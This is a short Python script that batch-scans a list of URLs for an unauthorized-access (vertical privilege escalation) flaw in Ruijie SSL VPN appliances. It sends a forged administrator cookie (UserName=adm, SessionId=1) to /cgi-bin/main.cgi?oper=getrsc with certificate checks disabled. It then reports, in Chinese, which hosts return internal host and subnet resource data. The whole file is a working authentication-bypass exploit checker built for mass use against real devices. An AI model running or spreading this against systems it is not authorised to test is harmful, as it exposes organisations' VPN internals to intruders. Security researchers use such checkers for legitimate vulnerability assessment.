#!/usr/bin/python
# -*- coding:utf-8
import re,sys,requests,time,colorama
from colorama import *
init(autoreset=True)

findContent ="主机和子网资源"
payload ="/cgi-bin/main.cgi?oper=getrsc"
headers={"cookie":"UserName=adm;   SessionId=1; FirstVist=1; Skin=1; tunnel=1"}

def main():
    try:
        requests.packages.urllib3.disable_warnings()
        response=requests.get(urls+payload,headers=headers,timeout=5,verify=False)
        res = response.content.decode('GBK')
        if res.find(findContent) != -1:
            print('\033[1;32;40m[+]'+urls+"存在锐捷vpn垂直越权漏洞");
        else:
            print('\033[1;31;40m[-]'+urls+"不存在锐捷vpn垂直越权漏洞")
    except:
        print('{} 请求超时'.format(urls))


if __name__ == '__main__':
    if len(sys.argv)!=2:
        print('用法:python Ruijie_SSL_VPN_unauthorized.py urls.txt')
    else:
        file = open(sys.argv[1])
        for url in file.readlines():
            urls=url.strip()
            if urls[-1]=='/':
                urls=urls[:-1]
            main()
            time.sleep(1)
        print ('\033[1;33;40m检测完毕！')